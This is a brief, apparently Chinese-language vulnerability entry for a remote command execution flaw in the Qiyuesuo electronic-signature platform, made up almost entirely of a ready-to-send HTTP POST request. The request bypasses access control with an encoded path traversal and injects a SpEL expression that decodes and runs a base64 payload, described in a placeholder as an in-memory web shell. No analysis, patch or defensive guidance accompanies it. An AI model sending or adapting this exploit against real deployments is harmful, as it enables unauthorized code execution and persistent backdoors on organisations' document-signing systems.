# 契约锁电子签章平台 templatehtmladd 远程命令执行漏洞

    ```
POST /captcha/%2e%2e/template/html/add HTTP/1.1 
Host: xxx
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 16398

{"file":"abc","title":"abc","params":[{"extensionParam":"{\"expression\":\"var org.springframework.expression.spel.standard.SpelExpressionParser();var b='base64 编 码 后 的 内 存 马 ';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a['parseExpression'](deStr);c.getValue();\"}","name":"test"}]}
```
